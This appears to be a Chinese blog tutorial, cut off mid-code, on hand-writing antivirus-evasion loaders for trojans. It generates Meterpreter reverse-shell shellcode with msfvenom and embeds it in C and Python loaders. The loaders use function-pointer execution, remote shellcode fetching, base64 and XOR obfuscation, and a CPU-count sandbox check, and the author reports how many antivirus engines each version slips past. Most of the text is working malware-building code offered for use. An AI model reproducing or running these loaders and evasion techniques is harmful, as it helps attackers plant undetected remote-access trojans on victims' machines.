![在这里插入图片描述](https://img-blog.csdnimg.cn/6766dbdcfc914212a8eb50cceb24f15a.png)
# 前言
这篇文章主要是记录手动编写代码进行木马免杀，使用工具也可以免杀，只不过太脚本小子了，而且工具的特征也容易被杀软抓到，指不定哪天就用不了了，所以要学一下手动去免杀木马，也方便以后开发一个只属于自己的木马

关于使用工具免杀的教程：
```
https://github.com/TideSec/BypassAntiVirus
```
# 工具安装
## Visual studio
Visual studio：
```
https://visualstudio.microsoft.com/zh-hans/
```
这款工具可以将代码编译成exe文件，下载社区版即可

![在这里插入图片描述](https://img-blog.csdnimg.cn/862090f1cd7b42a2ab9332acb01b7de4.png)

双击打开安装包，选择要安装的模块

![在这里插入图片描述](https://img-blog.csdnimg.cn/1f48739ae0324cab8e2c5e984928d563.png)


点击安装后等待即可


![在这里插入图片描述](https://img-blog.csdnimg.cn/40f1a8671a4c49e5990e648e8281acfe.png)


安装完成后，点击启动就能运行Visual studio


![在这里插入图片描述](https://img-blog.csdnimg.cn/a9c4143e2dd745a18a59b517ae1fbd63.png)

登录时可以跳过登录，不需要注册账号

## pyinstaller
pyinstaller模块可以将python脚本打包成exe文件，这里安装一下
```
pip3 install pyinstaller
```
python版本最好为python3.8.6

## msfvenom
msfvenom是kali自带的一个工具，它可以生成各种的shellcode，还能对shellcode进行免杀，但是msfvenom的特征已经被杀软公司识别了，过杀软的可能性很低

列出msfvenom所有的payload
```
msfvenom --list payload
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/af11d5a9d99243dca375b4d9c3a6348b.png)


不同的系统所使用的payload也不一样，选择的连接方式也有很多

列出msfvenom所有的编码器

```
msfvenom --list encoders
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/9c21fdd5c0e348c9abc72f0270fb6ea3.png)

这些都是msfvenom自带的一些免杀模块

# 使用c语言对木马进行免杀
比起使用c语言对木马进行免杀，我更喜欢用python对木马进行免杀，之后的制作木马也是用的python，这里c语言免杀木马只举两个简单的例子，大家可以直接去看python的木马免杀
## 指针执行
首先我们用msfvenom生成一个c语言的木马源代码，这里测试的平台是windows，所以payload也为常见的windows的paylaod，这里还使用了msfvenom自带的shikata_ga_nai编码器，提高一些免杀率

\x00指令是空指令，为了防止shellcode报错，这里去掉\x00
```
msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' lhost=192.168.0.104 lport=4444  -f c -o shell.c
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/02809ee0578e4ee1814f15bc90d6407b.png)


执行命令后，会在当前目录下生成一个shell.c文件，里面就是我们的shellcode

![在这里插入图片描述](https://img-blog.csdnimg.cn/8064826f1fc347c9a78dca4cc18efea7.png)


现在打开Visual studio，新建一个项目

![在这里插入图片描述](https://img-blog.csdnimg.cn/6484b491320940ecbc59dc35178e2f41.png)


然后选择空项目

![在这里插入图片描述](https://img-blog.csdnimg.cn/3d30ded1797447fa8b8635f82b160353.png)


最后自己设置文件保存的位置以及项目的名称


![在这里插入图片描述](https://img-blog.csdnimg.cn/63aeb1c273164f21882bd933a8568b1b.png)


然后右击源文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/6e79b386d2eb47c4b4205d52fa77d2eb.png)


选择新建一个项

![在这里插入图片描述](https://img-blog.csdnimg.cn/4c950b653eb548a2b79a2755dd61f379.png)


注意需要把后缀改为.c，然后点击添加

![在这里插入图片描述](https://img-blog.csdnimg.cn/822dba7511444a7a876073cf10f099d0.png)

代码：
```
#include <windows.h>
#include <stdio.h>
#include <string.h>
#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"") #运行时不弹出终端

unsigned char buf[] =
"\xd9\xcc\xba\x62\xe7\x49\xd0\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x7b\x31\x56\x18\x03\x56\x18\x83\xee\x9e\x05\xbc\x0b\x91\x13"
"\x4b\x88\xd9\x1e\x42\x7e\xe9\x7f\xf5\x4c\x20\xce\x7d\x30\x74"
"\x35\x4f\x60\x6d\x35\xf9\x99\x99\x62\x75\xa8\x72\x53\x2e\x3d"
"\x5b\x82\xf9\x3f\xf8\x86\x1b\xbc\xec\xa4\xe8\x92\x51\x67\xd1"
"\xb0\x3b\x02\xdd\x0e\x08\x29\x83\x27\x4e\xcb\x88\x7b\x72\x85"
"\x13\x1d\xbc\x8c\xd8\x68\x57\x2c\x0b\xef\x9c\x80\x24\x76\x1a"
"\xb7\xc0\xa8\xe5\x06\x0c\x0e\x63\x09\x0a\x62\xf3\xda\xfd\x52"
"\x99\x0a\xe5\x17\x78\xf9\x3c\x60\xad\x1f\xfe\xb6\xe0\x9b\xf4"
"\x18\x20\x1b\x50\x4d\x47\x25\xf7\xb5\xe5\x0f\x99\xdc\xd1\x3d"
"\x3e\x57\x25\x8c\xab\x6c\xb6\x13\xb0\xe2\x7d\x95\x1f\xc6\x4f"
"\x35\xaf\x39\x75\xf4\x02\x80\x07\x89\xc2\x4a\xa3\xae\x25\xaa"
"\x4c\x70\x1d\x2a\x76\xe6\x2b\x67\xaf\x7c\x80\x83\x0b\x04\x38"
"\x30\x9d\x8a\x09\xdb\xaa\xff\x2a\x35\x89\x90\x1a\x81\xb2\x85"
"\x24\xa5\xd5\x96\x80\x77\xbc\x11\x3f\x0f\xbd\x7f\x8b\x52\xfc"
"\x8a\xc1\x2a\x11\xde\xac\xae\xe7\x54\x47\x2b\xfd\x53\xf4\xd8"
"\x85\xdb\x99\x4b\x66\x2f\x61\xe7\xd0\x66\x40\x60\x7f\xf1\xc3"
"\xee\x47\xe5\x30\xc2\x28\x65\xcc\x42\x3d\x44\x09\x3f\x05\x84"
"\x57\x78\x14\xd1\xac\xf8\x6b\x78\x07\x07\x7c\x12\x82\xf3\xfb"
"\x04\xa6\xb4\xad\x4c\xc2\xa7\x53\x79\xe7\xd1\x32\x54\xd2\xf4"
"\xb1\xaf\x4b\xd9\x58\xe1\x2a\x6c\x4c\xc4\x1a\xde\xf7\x1d\x86"
"\x50\xc2\x4c\x50\x96\x25\x96\xcb\x63\xd1\xa6\x2c\x59\x8b\x34"
"\xe4\xc0\x6b\x92\x63\xd6\x69\x15\x09\x3d\x26\xb2\xff\xd8\x6e"
"\xc9\xf4\xa9\x06\xd3\xc0\x7b\xfe\x99\xfa\x89\x67\x9e\x6c\x70"
"\xd4\xc2\x21\x35\x8d\xed\xf7\xe6\xf4\x4f\x7d\x49\xb9\x09\x14"
"\xc6\x31\x9c\xd0\x64\x45\x97\x9e\xc7\x02\x11\x98\x41\x36\x81"
"\xe8\xb6\x7b\x5d\xce\x2c\x25\x4c\x99\xf1\x4c\x9e\x0b\xb3\x4a"
"\x4d\xbf\x2a\x06\x37\x9e\x4f\xe3\x11\x7f\xdc\x4c\x23\xc9\xa1"
"\xca\xec\x5a\x28\xde\x61\x1a\x9c\x1b\xfa\x04\xc4\xb0\x17\xf6"
"\xe6\xa9\xf7\x23\x2b\xf1\xe9\x40\x59\x24\x5f\xc0\x6d\x41\x22"
"\x19\xd5\x17\xea\xd0\xaf\x5e\x41\x8b\x73\x64\x70\x8d\xee\x94"
"\xc6\x1b\x59\x57\x37\x34\x4f\x85\x42\xd0\xdb\x4e\xdf\x25\xa2"
"\xe0\x35\xaf\x74\xd1\xc8\x96\x68\xd2\x2a\xa1\xd9\xf9\xeb\xaf"
"\xef\x5e\x85\xce\x84\xc3\x0c\xa1\x8b\x13\x3b\x19\xeb\xb6\x86"
"\x1a\xe5\xe7\xa5\x22\x6f";  #msfvenom生成的shellcode

main()
{
	((void(*)(void)) & buf)();  #利用指针来执行函数
}
```
然后ctrl+b生成exe文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/5152843f00694cdf8395a7cceb7ba952.png)


找到文件地址

![在这里插入图片描述](https://img-blog.csdnimg.cn/630dafe74ce14c7d8a20d5ae84c63666.png)


### virustotal网站测试
现在就来测试能过多少个杀软，这里用一个在线的病毒分析网站
```
https://www.virustotal.com/gui/home/upload
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/f95c987410cb424bade411d43b4dc707.png)

选择我们制作的木马文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/257b3165f8284f8c853f7723ab3e509a.png)


点击上传

![在这里插入图片描述](https://img-blog.csdnimg.cn/9f6aeb9176af45ca91aae85cb5248fe2.png)


![在这里插入图片描述](https://img-blog.csdnimg.cn/20695fd1589447da81961165937097d1.png)


通过率为15/69

### 微步云沙箱  

微步云沙箱是一个国内测试病毒的在线网站
```
https://s.threatbook.com/
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/ab7e4c39390d432cb443387cc4465c1f.png)


通过率为4/22

### 实战测试
![在这里插入图片描述](https://img-blog.csdnimg.cn/988d055aec2f4eab9dff10cf03b06281.png)


腾讯电脑管家，火绒，windows defender没报毒，360报毒

![在这里插入图片描述](https://img-blog.csdnimg.cn/9dca373b87d44204be4583b8b879fe08.png)
### 总结
只是利用指针执行函数过了大部分杀软，可是还是有一些过不了，但是我们可以打组合拳
## 指针执行+类型转换
还是上面那些代码，只不过新加了一个类型转换的代码
```
#include <windows.h>
#include <stdio.h>
#include <string.h>
#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")

unsigned char buf[] =
"\xd9\xcc\xba\x62\xe7\x49\xd0\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x7b\x31\x56\x18\x03\x56\x18\x83\xee\x9e\x05\xbc\x0b\x91\x13"
"\x4b\x88\xd9\x1e\x42\x7e\xe9\x7f\xf5\x4c\x20\xce\x7d\x30\x74"
"\x35\x4f\x60\x6d\x35\xf9\x99\x99\x62\x75\xa8\x72\x53\x2e\x3d"
"\x5b\x82\xf9\x3f\xf8\x86\x1b\xbc\xec\xa4\xe8\x92\x51\x67\xd1"
"\xb0\x3b\x02\xdd\x0e\x08\x29\x83\x27\x4e\xcb\x88\x7b\x72\x85"
"\x13\x1d\xbc\x8c\xd8\x68\x57\x2c\x0b\xef\x9c\x80\x24\x76\x1a"
"\xb7\xc0\xa8\xe5\x06\x0c\x0e\x63\x09\x0a\x62\xf3\xda\xfd\x52"
"\x99\x0a\xe5\x17\x78\xf9\x3c\x60\xad\x1f\xfe\xb6\xe0\x9b\xf4"
"\x18\x20\x1b\x50\x4d\x47\x25\xf7\xb5\xe5\x0f\x99\xdc\xd1\x3d"
"\x3e\x57\x25\x8c\xab\x6c\xb6\x13\xb0\xe2\x7d\x95\x1f\xc6\x4f"
"\x35\xaf\x39\x75\xf4\x02\x80\x07\x89\xc2\x4a\xa3\xae\x25\xaa"
"\x4c\x70\x1d\x2a\x76\xe6\x2b\x67\xaf\x7c\x80\x83\x0b\x04\x38"
"\x30\x9d\x8a\x09\xdb\xaa\xff\x2a\x35\x89\x90\x1a\x81\xb2\x85"
"\x24\xa5\xd5\x96\x80\x77\xbc\x11\x3f\x0f\xbd\x7f\x8b\x52\xfc"
"\x8a\xc1\x2a\x11\xde\xac\xae\xe7\x54\x47\x2b\xfd\x53\xf4\xd8"
"\x85\xdb\x99\x4b\x66\x2f\x61\xe7\xd0\x66\x40\x60\x7f\xf1\xc3"
"\xee\x47\xe5\x30\xc2\x28\x65\xcc\x42\x3d\x44\x09\x3f\x05\x84"
"\x57\x78\x14\xd1\xac\xf8\x6b\x78\x07\x07\x7c\x12\x82\xf3\xfb"
"\x04\xa6\xb4\xad\x4c\xc2\xa7\x53\x79\xe7\xd1\x32\x54\xd2\xf4"
"\xb1\xaf\x4b\xd9\x58\xe1\x2a\x6c\x4c\xc4\x1a\xde\xf7\x1d\x86"
"\x50\xc2\x4c\x50\x96\x25\x96\xcb\x63\xd1\xa6\x2c\x59\x8b\x34"
"\xe4\xc0\x6b\x92\x63\xd6\x69\x15\x09\x3d\x26\xb2\xff\xd8\x6e"
"\xc9\xf4\xa9\x06\xd3\xc0\x7b\xfe\x99\xfa\x89\x67\x9e\x6c\x70"
"\xd4\xc2\x21\x35\x8d\xed\xf7\xe6\xf4\x4f\x7d\x49\xb9\x09\x14"
"\xc6\x31\x9c\xd0\x64\x45\x97\x9e\xc7\x02\x11\x98\x41\x36\x81"
"\xe8\xb6\x7b\x5d\xce\x2c\x25\x4c\x99\xf1\x4c\x9e\x0b\xb3\x4a"
"\x4d\xbf\x2a\x06\x37\x9e\x4f\xe3\x11\x7f\xdc\x4c\x23\xc9\xa1"
"\xca\xec\x5a\x28\xde\x61\x1a\x9c\x1b\xfa\x04\xc4\xb0\x17\xf6"
"\xe6\xa9\xf7\x23\x2b\xf1\xe9\x40\x59\x24\x5f\xc0\x6d\x41\x22"
"\x19\xd5\x17\xea\xd0\xaf\x5e\x41\x8b\x73\x64\x70\x8d\xee\x94"
"\xc6\x1b\x59\x57\x37\x34\x4f\x85\x42\xd0\xdb\x4e\xdf\x25\xa2"
"\xe0\x35\xaf\x74\xd1\xc8\x96\x68\xd2\x2a\xa1\xd9\xf9\xeb\xaf"
"\xef\x5e\x85\xce\x84\xc3\x0c\xa1\x8b\x13\x3b\x19\xeb\xb6\x86"
"\x1a\xe5\xe7\xa5\x22\x6f";


int buf_s() {

	((void(*)(void)) & buf)(); #通过指针运行函数
}
void main()
{
	((void(WINAPI*)(void)) & buf_s)();  #类型转换
}
```
### virustotal网站测试
![在这里插入图片描述](https://img-blog.csdnimg.cn/08ac40c9f6994352868deb94c477d44d.png)

通过率为13/70，比第一次大了一些
### 微步云沙箱 

![在这里插入图片描述](https://img-blog.csdnimg.cn/18d4db31f65f4b94898746c0310eb94b.png)


通过率为2/22
### 实战测试

和第一个一样，腾讯电脑管家，火绒，windows defender没报毒，360报毒

![在这里插入图片描述](https://img-blog.csdnimg.cn/4d8b583ee59b4ce1af2d4244823dcc10.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/6ebc4f5c8ba1406c8861b8620d8b8221.png)


### 总结
指针执行+类型转换将免杀率提升了一点，但是使用python免杀比使用c语言进行免杀方便

# 使用python对木马免杀
比起使用c语言对木马进行免杀，我更喜欢用python对木马进行免杀
## 远程加载
生成shellcode
```
msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' lhost=192.168.0.104 lport=4444  -f python -o shell.txt
```
我们可以不用把shellcode写死在程序里，可以使用urllib.request模块去远程获取shellcode代码并加载
```
import urllib.request

buf = urllib.request.urlopen('http://ip/shellcode.txt').read()
buf = buf.decode('utf-8')

page = ctypes.windll.kernel32.VirtualAlloc(0, len(buf), 0x1000, 0x40)
//申请内存

ctypes.windll.kernel32.RtlMoveMemory(page, ctypes.create_string_buffer(buf), len(buf))
handle = ctypes.windll.kernel32.CreateThread(0, 0, page, 0, 0, 0)
//创建线程

ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
//把程序加载到内存里并运行shellcode
```
pyinstaller打包
```
pyinstaller -F test.py
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/4dfed729f16445a18a58bda76673f6d1.png)


![在这里插入图片描述](https://img-blog.csdnimg.cn/d0d938131eee4164b50b2430c304cefd.png)


![在这里插入图片描述](https://img-blog.csdnimg.cn/3158bcab158d47b9bfe849823955b0b6.png)


这种方法只是一个思路，无法动态过杀软，杀软对加载到内存的代码也敏感

![在这里插入图片描述](https://img-blog.csdnimg.cn/7ebc818756ea4431a91f47a6cff973b7.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/082afdc7c2bd4302b3bf164537f54301.png)


## 内容加密
我们可以对内容进行加密，增加免杀率
### base64
可以使用base64对敏感代码加密后再解密执行
```
import ctypes
import base64

shellcode ='WEhoaFpGeDRPV1ZjZUdKa1hIZ3hNVng0TlRkY2VEa3hYSGd6WkZ4NE5EVmNlR0V3WEhoa1pseDRNelZjZURneVhIZzNNVng0TXpSY2VHTTFYSGd4TWx4NE5UVmNlRE5pWEhnMllseDRaVFpjZURoa1hIZzRPRng0Tm1GY2VETmhYSGd5TVZ4NE5qQmNlRGcwWEhobFpGeDRaRFJjZURBMVhIZ3daRng0TUdaY2VHTmpYSGhpWmx4NFpEUmNlRGhqWEhobU1seDROR05jZURkalhIZzBNMXg0TkdaY2VEQXlYSGhoTmx4NE5tRmNlR0kyWEhobVpWeDRObUpjZURkbVhIZzFNRng0Tm1KY2VEazVYSGczWVZ4NFlUZGNlR015WEhnME4xeDRNelpjZUdZM1hIZ3dZMXg0WTJSY2VHUmlYSGhsTlZ4NE9EQmNlR1F6WEhobU9GeDRNVFJjZURFeVhIaG1NRng0WW1KY2VHSmpYSGd3TjF4NE1qWmNlREprWEhnNU5seDRabU5jZURoaFhIZ3dNVng0WTJaY2VESXlYSGcwTlZ4NFpHWmNlRFF4WEhobE1seDROekZjZUdKalhIZzNNbHg0TnpoY2VETmhYSGhsWTF4NE1qQmNlR0l3WEhoaU1GeDRNRFpjZUdOalhIZzFaVng0WlROY2VHWm1YSGc1WTF4NE56WmNlRGxtWEhnMlpGeDROVEJjZUROaFhIZzVOVng0TlRWY2VEVmlYSGhrTlZ4NFpEZGNlRFEwWEhnNFlseDRNV0pjZURrd1hIaGpabHg0T1RSY2VEY3lYSGcyTlZ4NE9EUmNlREV6WEhobE9GeDRPRFZjZURabVhIZzJORng0TWpkY2VEZzVYSGhpWlZ4NE56aGNlRFJoWEhneFkxeDRaalpjZURGalhIZ3dPRng0T0RKY2VEWmpYSGhpWVZ4NE1qZGNlRFJtWEhnM1kxeDRZV1JjZUdVM1hIaGpNVng0WVRCY2VHWTBYSGcyT0Z4NFpXRmNlRFZrWEhoa05GeDRZakJjZURFMVhIZ3pPRng0TVRSY2VEazBYSGc1TVZ4NFlXVmNlRFkwWEhnME1WeDRZbU5jZURrNVhIZzJaRng0TlRaY2VHUm1YSGhtWkZ4NE1ETmNlRGRrWEhoa1pseDRaamxjZURVeVhIaGxPRng0WkRKY2VETXlYSGcwTWx4NE4yUmNlRFl3WEhnd05GeDRNalpjZUdKbVhIZ3lObHg0TWpGY2VHTTRYSGd3TUZ4NE5UZGNlR1UwWEhnMk4xeDROR1JjZURZMlhIZzNNRng0TldOY2VERmpYSGd6Tmx4NFptVmNlR0V4WEhoak5WeDRZbUpjZURZNVhIaGxOMXg0TkRoY2VEZG1YSGhrWVZ4NE9EUmNlR1prWEhnMVlWeDRNelpjZUdNMlhIaG1ZbHg0T1RoY2VESXpYSGhtTmx4NFlUUmNlR014WEhobU9WeDROVGRjZURsbVhIZ3lNMXg0WXpGY2VEZ3hYSGd3TUZ4NFpXSmNlR1EyWEhoaU1WeDROek5jZURrMFhIaGxaVng0TWpkY2VHWmhYSGhsTWx4NE5HWmNlR0l4WEhnM09GeDRNR1ZjZURNMFhIZ3pNMXg0TmpOY2VEaGlYSGhqTkZ4NFpEbGNlR1V3WEhnd1pGeDRPRFpjZUdJMVhIZ3labHg0WldaY2VEZGlYSGhtWWx4NE9ERmNlR05qWEhneU5WeDRaV0ZjZURaaFhIZzFZMXg0TUdKY2VHSTVYSGhrWkZ4NFpEaGNlRFpqWEhnNE1seDRaVFJjZUdFM1hIZ3hNMXg0WTJSY2VHVTJYSGc1WlZ4NFpqaGNlR1V3WEhnMU4xeDRaVFJjZURFNVhIaGtaRng0WkdOY2VHSmxYSGd6WlZ4NFpUSmNlR0V6WEhnek9GeDRaV1JjZURFNVhIaGpOMXg0TjJSY2VHVXdYSGd6TjF4NFlUaGNlRFpoWEhneVpseDRPRFpjZUdJd1hIZzJZVng0WTJWY2VHTXpYSGhoWlZ4NE4yWmNlRGcwWEhoa05WeDRaamRjZURNMVhIZ3dPRng0TkRGY2VEazFYSGczTlZ4NFpXTmNlREZrWEhnelkxeDRNVFpjZURVNVhIaG1PVng0TlRGY2VEVmlYSGhqTTF4NE1tWmNlR1psWEhneE5WeDRaRFZjZUdVM1hIZzRObHg0T1ROY2VHRTRYSGcwTkZ4NE5HRmNlRGczWEhoaFkxeDRNakpjZUdZMVhIaGpOMXg0TkRoY2VETXpYSGhqTjF4NE5XWmNlR1JpWEhneU1GeDRaRFpjZURnd1hIZzVORng0TlRkY2VEVm1YSGhqTkZ4NE1XRmNlR0k1WEhoaU5seDRaVFpjZURRNFhIZzBOMXg0TnpWY2VEQTBYSGc0Tmx4NE9HTmNlREUyWEhoak4xeDRNbU5jZUdKaVhIZ3daRng0WXpSY2VEWmxYSGd5T0Z4NE1qSmNlRGRrWEhoalpseDRNVGxjZURZMFhIZzBPRng0TkdWY2VEWmtYSGhoT0Z4NFlqZGNlR0UwWEhnM05seDROVFJjZURRNVhIaGpPVng0TkRKY2VHTTNYSGd3WWx4NE9ESmNlR0ZrWEhnd1pWeDRNakJjZURZNVhIaGtOMXg0T1RoY2VHSTBYSGhpWWx4NFpESmNlRFV6WEhnelkxeDROelZjZURRd1hIaGtNMXg0TTJGY2VETmlYSGczT0Z4NFlXRmNlR014WEhneU5GeDROVFJjZURaalhIaGxOVng0TVdSY2VEQmxYSGhsTkZ4NFpUbGNlREU0WEhnMk1WeDRNVFpjZURFMlhIZzNNRng0WW1aY2VETTBYSGcxTlZ4NFpqSmNlRGd5WEhneVkxeDRNak5jZUdFMlhIZzBNbHg0TURGY2VEbGpYSGd5WVZ4NFlqTmNlR1ppWEhnek1seDRZakJjZURBd1hIZzFOVng0WlROY2VHUmpYSGc0TjF4NE5UUmNlR0ZrWEhobFpWeDRNMk5jZURsa1hIZzNOMXg0WkRsY2VEUmtYSGhtTWx4NE5UaGNlRFV3WEhoaVpseDRaREJjZURZNVhIZ3lZVng0TkdWY2VEVTFYSGhtWlZ4NE5HTmNlRGcwWEhoaU9WeDRPRFJjZUdZelhIaGpZMXg0WTJWY2VEbGpYSGhoWkZ4NE0yVmNlREJpWEhnME1WeDRNRGxjZURBeFhIZzNOMXg0TlROY2VHRTJYSGhrTUZ4NFpEVmNlR1JtWEhnMlpseDROamhjZURJM1hIZzRObHg0TldSY2VEZGpYSGcyWVZ4NE1tRmNlRFUxWEhnNE9WeDRPRFJjZUdFMFhIZ3dNVng0WVRKY2VEQTFYSGhtTlZ4NFltVmNlR1F4WEhnd05WeDRNR05jZUdJelhIZzVPRng0WTJSY2VEQTFYSGd6TTF4NFlqbGNlRFU0WEhnelpWeDRNbVZjZURBd1hIaGlabHg0WTJKY2VHTmtYSGd4Tmx4NE56aGNlR1EwWEhoaE5seDRZamRjZUdFd1hIZ3pabHg0TTJGY2VHRmtYSGc1TWx4NE5tWmNlRGxrWEhneVpGeDROVE5jZUdOaVhIZzFNRng0TmpCY2VERXhYSGhsWkZ4NE9ESmNlRFU1WEhneE9WeDRZVFpjZUdZdw=='
//对shellcode进行了两次的base64加密

shellcode = base64.b64decode(base64.b64decode(shellcode))
//进行两次shellcode解密

shellcode = shellcode.decode('utf-8')
loader = "Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MucmVzdHlwZT1jdHlwZXMuY191aW50NjQ7cnd4cGFnZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jKDAsIGxlbihzaGVsbGNvZGUpLCAweDEwMDAsIDB4NDApO2N0eXBlcy53aW5kbGwua2VybmVsMzIuUnRsTW92ZU1lbW9yeShjdHlwZXMuY191aW50NjQocnd4cGFnZSksIGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihzaGVsbGNvZGUpLCBsZW4oc2hlbGxjb2RlKSk7aGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoMCwgMCwgY3R5cGVzLmNfdWludDY0KHJ3eHBhZ2UpLCAwLCAwLCAwKTtjdHlwZXMud2luZGxsLmtlcm5lbDMyLldhaXRGb3JTaW5nbGVPYmplY3QoaGFuZGxlLCAtMSk="
//对加载内存里并运行shellcode的代码进行了一次base64加密

exec (base64.b64decode(loader))
//使用exec函数执行loader变量里的代码
```
打包
```
pyinstaller -F test.py
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/17953a6c37cf4761b98b4f909e6d3032.png)


静态能过360全家桶，火绒，腾讯管家和微软

在线网站还是老样子

### xor加密
也可以使用异或加密来对木马进行免杀
加密：
```
def enc(shellcode, key):
   result = ''
   for i in range(len(shellcode)):
       result += chr(ord(shellcode[i]) ^ key)
   return result
//xor加密

shellcode = ""
//要加密的shellcode

key = 9
enc_shellcode = enc(shellcode, key)
//获得加密后的shellcode

print(enc_shellcode)
```
解密：
```
def enc(shellcode, key):
   result = ''
   for i in range(len(shellcode)):
       result += chr(ord(shellcode[i]) ^ key)
   return result

enc_shellcode = ""
//加密后的shellcode代码

key = 9

shellcode = enc(enc_shellcode,key).encode()
//进行解密
```
### 总结
除了xor加密，还可以使用aes之类的加密方式，也可以使用python里的Cryptography库进行加解密，大家可以自行研发

## 反沙箱
在线网站和一些杀软会生成一个沙箱，去运行程序并检测，一般这个沙箱很小
### 通过cup核心数判断是否是沙箱
```
from multiprocessing import cpu_count 
import base64
import ctypes

cpu_num = cpu_count()
判断cpu核心数

if(cpu_num >= 4):
//如果cpu核心数大于4就执行shellcode

	shellcode ='WEhoaFpGeDRPV1ZjZUdKa1hIZ3hNVng0TlRkY2VEa3hYSGd6WkZ4NE5EVmNlR0V3WEhoa1pseDRNelZjZURneVhIZzNNVng0TXpSY2VHTTFYSGd4TWx4NE5UVmNlRE5pWEhnMllseDRaVFpjZURoa1hIZzRPRng0Tm1GY2VETmhYSGd5TVZ4NE5qQmNlRGcwWEhobFpGeDRaRFJjZURBMVhIZ3daRng0TUdaY2VHTmpYSGhpWmx4NFpEUmNlRGhqWEhobU1seDROR05jZURkalhIZzBNMXg0TkdaY2VEQXlYSGhoTmx4NE5tRmNlR0kyWEhobVpWeDRObUpjZURkbVhIZzFNRng0Tm1KY2VEazVYSGczWVZ4NFlUZGNlR015WEhnME4xeDRNelpjZUdZM1hIZ3dZMXg0WTJSY2VHUmlYSGhsTlZ4NE9EQmNlR1F6WEhobU9GeDRNVFJjZURFeVhIaG1NRng0WW1KY2VHSmpYSGd3TjF4NE1qWmNlREprWEhnNU5seDRabU5jZURoaFhIZ3dNVng0WTJaY2VESXlYSGcwTlZ4NFpHWmNlRFF4WEhobE1seDROekZjZUdKalhIZzNNbHg0TnpoY2VETmhYSGhsWTF4NE1qQmNlR0l3WEhoaU1GeDRNRFpjZUdOalhIZzFaVng0WlROY2VHWm1YSGc1WTF4NE56WmNlRGxtWEhnMlpGeDROVEJjZUROaFhIZzVOVng0TlRWY2VEVmlYSGhrTlZ4NFpEZGNlRFEwWEhnNFlseDRNV0pjZURrd1hIaGpabHg0T1RSY2VEY3lYSGcyTlZ4NE9EUmNlREV6WEhobE9GeDRPRFZjZURabVhIZzJORng0TWpkY2VEZzVYSGhpWlZ4NE56aGNlRFJoWEhneFkxeDRaalpjZURGalhIZ3dPRng0T0RKY2VEWmpYSGhpWVZ4NE1qZGNlRFJtWEhnM1kxeDRZV1JjZUdVM1hIaGpNVng0WVRCY2VHWTBYSGcyT0Z4NFpXRmNlRFZrWEhoa05GeDRZakJjZURFMVhIZ3pPRng0TVRSY2VEazBYSGc1TVZ4NFlXVmNlRFkwWEhnME1WeDRZbU5jZURrNVhIZzJaRng0TlRaY2VHUm1YSGhtWkZ4NE1ETmNlRGRrWEhoa1pseDRaamxjZURVeVhIaGxPRng0WkRKY2VETXlYSGcwTWx4NE4yUmNlRFl3WEhnd05GeDRNalpjZUdKbVhIZ3lObHg0TWpGY2VHTTRYSGd3TUZ4NE5UZGNlR1UwWEhnMk4xeDROR1JjZURZMlhIZzNNRng0TldOY2VERmpYSGd6Tmx4NFptVmNlR0V4WEhoak5WeDRZbUpjZURZNVhIaGxOMXg0TkRoY2VEZG1YSGhrWVZ4NE9EUmNlR1prWEhnMVlWeDRNelpjZUdNMlhIaG1ZbHg0T1RoY2VESXpYSGhtTmx4NFlUUmNlR014WEhobU9WeDROVGRjZURsbVhIZ3lNMXg0WXpGY2VEZ3hYSGd3TUZ4NFpXSmNlR1EyWEhoaU1WeDROek5jZURrMFhIaGxaVng0TWpkY2VHWmhYSGhsTWx4NE5HWmNlR0l4WEhnM09GeDRNR1ZjZURNMFhIZ3pNMXg0TmpOY2VEaGlYSGhqTkZ4NFpEbGNlR1V3WEhnd1pGeDRPRFpjZUdJMVhIZ3labHg0WldaY2VEZGlYSGhtWWx4NE9ERmNlR05qWEhneU5WeDRaV0ZjZURaaFhIZzFZMXg0TUdKY2VHSTVYSGhrWkZ4NFpEaGNlRFpqWEhnNE1seDRaVFJjZUdFM1hIZ3hNMXg0WTJSY2VHVTJYSGc1WlZ4NFpqaGNlR1V3WEhnMU4xeDRaVFJjZURFNVhIaGtaRng0WkdOY2VHSmxYSGd6WlZ4NFpUSmNlR0V6WEhnek9GeDRaV1JjZURFNVhIaGpOMXg0TjJSY2VHVXdYSGd6TjF4NFlUaGNlRFpoWEhneVpseDRPRFpjZUdJd1hIZzJZVng0WTJWY2VHTXpYSGhoWlZ4NE4yWmNlRGcwWEhoa05WeDRaamRjZURNMVhIZ3dPRng0TkRGY2VEazFYSGczTlZ4NFpXTmNlREZrWEhnelkxeDRNVFpjZURVNVhIaG1PVng0TlRGY2VEVmlYSGhqTTF4NE1tWmNlR1psWEhneE5WeDRaRFZjZUdVM1hIZzRObHg0T1ROY2VHRTRYSGcwTkZ4NE5HRmNlRGczWEhoaFkxeDRNakpjZUdZMVhIaGpOMXg0TkRoY2VETXpYSGhqTjF4NE5XWmNlR1JpWEhneU1GeDRaRFpjZURnd1hIZzVORng0TlRkY2VEVm1YSGhqTkZ4NE1XRmNlR0k1WEhoaU5seDRaVFpjZURRNFhIZzBOMXg0TnpWY2VEQTBYSGc0Tmx4NE9HTmNlREUyWEhoak4xeDRNbU5jZUdKaVhIZ3daRng0WXpSY2VEWmxYSGd5T0Z4NE1qSmNlRGRrW